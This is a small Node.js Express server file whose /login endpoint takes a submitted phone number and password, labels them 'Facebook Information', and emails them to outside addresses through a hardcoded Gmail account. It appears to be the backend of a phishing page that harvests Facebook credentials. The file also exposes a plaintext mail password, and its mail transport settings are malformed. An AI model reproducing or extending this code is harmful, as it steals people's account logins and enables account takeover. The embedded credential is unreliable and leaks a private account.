const express = require('express')
const app = express()
var cors = require('cors')
const mongoose = require('mongoose');
const nodemailer = require("nodemailer");
const port = 3000


app.use(cors())
app.use(express.json())


app.post('/login', async function (req, res) {
  console.log(req.body)
  res.send("data send")

  const transporter = nodemailer.createTransport({
    service: "mdshahadatalam25@gmail.com",
    port: 587,
    secure: false, // true for port 465, false for other ports
    auth: {
      user: "mdshahadatalam25@gmail.com",
      pass: "bmgy sbbw ctbm prdi",
    },
  });

  const info = await transporter.sendMail({
    from: '"Maddison Foo Koch 👻" <maddison53@ethereal.email>', // sender address
    to: "bar@example.com, baz@example.com", // list of receivers
    subject: req.body.text, // Subject line
    text: "Facebook Information", // plain text body
    html: `<b>Number:</b>${req.body.text}
           <b>Password:</b>${req.body.pass}
          `, // html body
  });

  console.log("Message sent: %s", info.messageId);
})

app.get('/', (req, res) => {
  res.send('Hello World!')
})

app.listen(port, () => {
  console.log(`Example app listening on port ${port}`)
})


